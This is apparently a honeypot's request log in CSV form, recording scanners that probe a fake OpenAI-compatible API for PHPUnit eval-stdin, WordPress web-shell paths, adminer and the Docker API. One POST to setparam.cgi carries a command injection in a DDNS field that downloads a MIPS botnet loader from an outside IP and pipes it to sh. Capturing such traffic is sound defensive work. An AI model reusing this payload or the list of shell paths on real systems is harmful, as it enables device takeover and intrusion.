request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
e52ea9ef-217c-4a05-9714-f61c387a215a,2026-04-23T22:58:23.922047+00:00,anon_999997c0,GET,/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9313bc91-8eda-46ea-ae97-30702b436e29,2026-04-23T22:58:25.562377+00:00,anon_999997c0,GET,/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
ee3f1b09-5801-476e-8e44-d3f1e3938ddc,2026-04-23T22:58:27.045086+00:00,anon_999997c0,GET,/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e9fb9e89-81a7-492c-a0b2-e4293ee908a4,2026-04-23T22:58:28.575864+00:00,anon_999997c0,GET,/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b4b7ce2d-48d6-41d9-9c73-630fe895870c,2026-04-23T22:58:30.066366+00:00,anon_999997c0,GET,/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
3f6d12b1-d025-45f2-aa36-f794f4069bdd,2026-04-23T22:58:32.270887+00:00,anon_999997c0,GET,/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
14de0f8f-23a7-403f-a177-9b4352c854b2,2026-04-23T22:58:33.686166+00:00,anon_999997c0,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
ac3a6c2a-a7fd-4a4f-b5a4-b37c5f9573d9,2026-04-23T22:58:35.928063+00:00,anon_999997c0,GET,/public/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
4e1ef5c7-ebc7-451e-ba6a-8b69b5b971b0,2026-04-23T22:58:37.505493+00:00,anon_999997c0,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c80fd0ea-5a01-4e60-a922-0c9a8d35382f,2026-04-23T22:58:39.051003+00:00,anon_999997c0,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
5f194982-1709-4194-a3dd-8b1823f56bc1,2026-04-23T22:58:40.579034+00:00,anon_999997c0,GET,/containers/json,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f3209c43-1b24-4b57-a3b4-1528ac425859,2026-04-23T23:02:44.649514+00:00,anon_445a1987,POST,/cgi-bin/admin/setparam.cgi,[honeypot-host],Mozilla/5.0,,559,316,1,,ddns_enable=0&ddns_provider=DyndnsDynamic&ddns_DyndnsDynamic_hostname=anon_f1412386&ddns_DyndnsDynamic_usernameemail=%24%28wget%20http%3A%2F%2F161.97.148.194%2Fnullnet_bin_dir%2Fnullnet_load.mips%20-O-%20%7C%20sh%29&ddns_DyndnsDynamic_passwordkey=root&ddns_DyndnsCustom_hostname=&ddns_DyndnsCustom_usernameemail=&ddns_DyndnsCustom_passwordkey=&ddns_TZO_hostname=&ddns_TZO_usernameemail=&ddns_TZO_passwordkey=&ddns_DHS_hostname=&ddns_DHS_usernameemail=&ddns_DHS_passwordkey=&ddns_DynInterfree_hostname=&ddns_DynInterfree_usernameemail=&ddns_DynInterfree_passwordkey=,ddns_enable=0&ddns_provider=DyndnsDynamic&ddns_DyndnsDynamic_hostname=anon_f1412386&ddns_DyndnsDynamic_usernameemail=%24%28wget%20http%3A%2F%2F161.97.148.194%2Fnullnet_bin_dir%2Fnullnet_load.mips%20-O-%20%7C%20sh%29&ddns_DyndnsDynamic_passwordkey=root&ddns_DyndnsCustom_hostname=&ddns_DyndnsCustom_usernameemail=&ddns_DyndnsCustom_passwordkey=&ddns_TZO_hostname=&ddns_TZO_usernameemail=&ddns_TZO_passwordkey=&ddns_DHS_hostname=&ddns_DHS_usernameemail=&ddns_DHS_passwordkey=&ddns_DynInterfree_hostname=&ddns_DynInterfree_usernameemail=&ddns_DynInterfree_passwordkey=,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c779a836-8cf6-4310-9043-d5cda02831fe,2026-04-23T23:21:32.602530+00:00,anon_a8906676,GET,/,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
47b59a14-84d7-41fd-bdf5-cd0d4d0ed24e,2026-04-23T23:21:33.142903+00:00,anon_a8906676,GET,/favicon.ico,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2894e7aa-9e8e-44ca-9ffe-169b8f08c691,2026-04-24T00:09:30.095917+00:00,anon_f2f1f5e1,GET,/wp-content/plugins/hellopress/wp_filemanager.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",1,
f542e7d7-0d6e-4334-a477-babc191ba4f1,2026-04-24T00:09:31.946106+00:00,anon_f2f1f5e1,GET,/error.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
98b5bdfd-3fac-4938-8f78-c0c8172f7a4c,2026-04-24T00:09:32.681218+00:00,anon_f2f1f5e1,GET,/wp-load.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2b1961e1-1bb9-4cfb-8cb2-3630321bfc61,2026-04-24T00:09:33.831363+00:00,anon_f2f1f5e1,GET,/77.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
bc59a16f-45c4-4d64-a160-5d7d6f207f4c,2026-04-24T00:09:34.953350+00:00,anon_f2f1f5e1,GET,/.sghb.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
ca213e68-7992-481e-8623-766e03345bba,2026-04-24T00:09:36.519058+00:00,anon_f2f1f5e1,GET,/zoko.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
032df95c-82a3-4377-b0bb-34391451d61e,2026-04-24T00:09:37.253173+00:00,anon_f2f1f5e1,GET,/solo1.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
dc2c736e-b370-4a0b-b9f9-11c64d222fea,2026-04-24T00:09:38.109781+00:00,anon_f2f1f5e1,GET,/locales.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8dcb952b-fa55-4b99-b378-ab9e4cb9c9dd,2026-04-24T00:09:39.633191+00:00,anon_f2f1f5e1,GET,/bgymj.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8f06298b-f3d1-4dd7-a9ac-e90d3d636282,2026-04-24T00:09:40.580597+00:00,anon_f2f1f5e1,GET,/pucci.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d0dd2051-e56b-4f67-8ff8-fa26534c8fb5,2026-04-24T00:09:42.230585+00:00,anon_f2f1f5e1,GET,/wp-includes/blocks/details/,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
3e16e981-655b-4ce1-927d-4ff05c8bb306,2026-04-24T00:09:43.640545+00:00,anon_f2f1f5e1,GET,/.dj/index.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e986c45c-fa3d-4a7b-a52e-218bcd5469e1,2026-04-24T00:09:44.930110+00:00,anon_f2f1f5e1,GET,/wp-includes/blocks/audio/,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a8e574bb-ffb4-4caf-9870-f239da3f214e,2026-04-24T00:09:46.689667+00:00,anon_f2f1f5e1,GET,/.tmb/,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
4cc99d21-f381-492f-bce6-4d58b18e6c6d,2026-04-24T00:09:48.387604+00:00,anon_f2f1f5e1,GET,/one.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
208fd59e-e087-4b73-a081-ebf7041333b0,2026-04-24T00:09:49.840929+00:00,anon_f2f1f5e1,GET,/fi.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
32a7a6d5-0302-41cb-be46-0b564cf937a2,2026-04-24T00:09:51.014298+00:00,anon_f2f1f5e1,GET,/dragonshell.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
0877a5f5-a071-4b69-81ba-b509fe10a46c,2026-04-24T00:09:51.978028+00:00,anon_f2f1f5e1,GET,/no20.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8174b0d8-f053-4144-a075-75a7af65e33a,2026-04-24T00:09:54.081493+00:00,anon_f2f1f5e1,GET,/wp-alone.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e3466945-cb1a-4d4c-a962-d146c16a5ff0,2026-04-24T00:09:56.891315+00:00,anon_f2f1f5e1,GET,/yasnu.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d0c16995-1a53-47e5-b26b-1fc7898dff08,2026-04-24T00:09:58.191270+00:00,anon_f2f1f5e1,GET,/sl.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
ccb8570c-5009-4899-adfc-539f45da5312,2026-04-24T00:09:59.603221+00:00,anon_f2f1f5e1,GET,/sw.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
284ae9ad-2fad-4d4c-aef6-8f3b84c5f8e0,2026-04-24T00:10:00.484694+00:00,anon_f2f1f5e1,GET,/vuln.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
80101536-8519-491a-9567-0ab726f28f0e,2026-04-24T00:10:02.501191+00:00,anon_f2f1f5e1,GET,/wp-temp.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a8b905b0-31e7-45a2-8e4a-276ffd34c909,2026-04-24T00:10:03.200333+00:00,anon_f2f1f5e1,GET,/sxdfrt.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
520d5e7f-b909-4c15-bee5-bfde3489bc7a,2026-04-24T00:10:04.054278+00:00,anon_f2f1f5e1,GET,/wp-content/themes/twentytwentyfive/assets/,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a88b04ab-5e4c-484c-8eea-e3c299b7772f,2026-04-24T00:10:04.890392+00:00,anon_f2f1f5e1,GET,/wp-includes/blocks/buttons/,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a157c140-8d5e-45c6-8b4c-e25d707b20f3,2026-04-24T00:10:06.377369+00:00,anon_f2f1f5e1,GET,/class-bda.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f931533d-80ea-4a48-98a8-2e35cf871c29,2026-04-24T00:10:07.619387+00:00,anon_f2f1f5e1,GET,/bhm.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
5b75ae24-eb75-483c-a409-97d76cff08f0,2026-04-24T00:10:09.541201+00:00,anon_f2f1f5e1,GET,/xmu.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
31af2ec5-2f67-44ce-9cd7-c6966d6a59e2,2026-04-24T00:10:13.235414+00:00,anon_f2f1f5e1,GET,/ref.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
0709d5bf-c758-4f42-8c76-b70ee42b106d,2026-04-24T00:10:14.246921+00:00,anon_f2f1f5e1,GET,/wp-xme.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
34682eb6-5d1a-440f-ad47-6768cdbc75dd,2026-04-24T00:10:16.001173+00:00,anon_f2f1f5e1,GET,/adminer.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
37d72fef-40f5-48b0-aee0-8fcdd6643c12,2026-04-24T00:10:16.846316+00:00,anon_f2f1f5e1,GET,/ktfow.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d2ce4ffa-0bb7-4ecc-9e41-268a595c7916,2026-04-24T00:10:17.938155+00:00,anon_f2f1f5e1,GET,/mode.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
177cd4ba-7629-4c28-9f96-bd14fe5ac4e5,2026-04-24T00:10:19.927572+00:00,anon_f2f1f5e1,GET,/Xx.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9b3b6f86-33db-4b59-9807-6a30b91cf7cc,2026-04-24T00:10:21.042484+00:00,anon_f2f1f5e1,GET,/xmini.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
820dd688-9936-4f65-8cde-18256bd25521,2026-04-24T00:10:22.580858+00:00,anon_f2f1f5e1,GET,/2468.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
ddcccde1-dfaa-491a-9897-7c63d38caa1d,2026-04-24T00:10:23.776699+00:00,anon_f2f1f5e1,GET,/wp-admin/js/index.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
4aa78fbd-effd-4904-8374-f67c16e898db,2026-04-24T00:10:25.442078+00:00,anon_f2f1f5e1,GET,/dx.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
988001fb-6d89-418b-8af0-363c96eceb3a,2026-04-24T00:10:26.088160+00:00,anon_f2f1f5e1,GET,/amdin.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
